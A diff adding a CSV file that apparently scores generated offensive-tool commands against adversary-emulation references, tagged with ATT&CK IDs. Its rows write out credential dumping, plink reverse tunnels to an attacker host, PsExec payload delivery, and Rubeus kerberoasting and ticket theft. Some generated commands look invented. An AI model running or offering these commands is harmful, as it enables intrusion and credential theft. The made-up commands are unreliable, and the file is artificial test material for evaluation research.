@@ -1,0 +1,18 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.333,True
+command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,0.4,True
+command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,0.392,True
+command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.404,True
+command_plink_TA0010_T1048.txt,plink,"plink.exe -no-sanitise-stderr -ssh <victim_ssh_user>@<victim_ssh_ip> -m ""<email_search_query>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.4,True
+command_plink_TA0010_T1048.txt,plink,"plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip> -o ""<output_file>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.383,True
+command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip> -P 22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.389,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.375,True
+command_psexec_TA0011_T1105.txt,psexec,psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.296,True
+command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe kill,`rubeus.exe kerberoast /domain:oz.local`,0.545,True
+command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe wipe /persistent /clear,`rubeus.exe kerberoast /domain:oz.local`,0.514,True
+command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe scrub /delete /all,`rubeus.exe kerberoast /domain:oz.local`,0.522,True
+command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe triage,`rubeus.exe kerberoast /domain:oz.local`,0.491,True
+command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe klist /service:krbtgt,`rubeus.exe kerberoast /domain:oz.local`,0.5,True
+command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe pass /ticket:<TGT-ticket-hash> /user:<victim-username>,`rubeus.exe kerberoast /domain:oz.local`,0.343,True
+command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe klist /luid:0x47869b4,`rubeus.exe kerberoast /domain:oz.local`,0.472,True
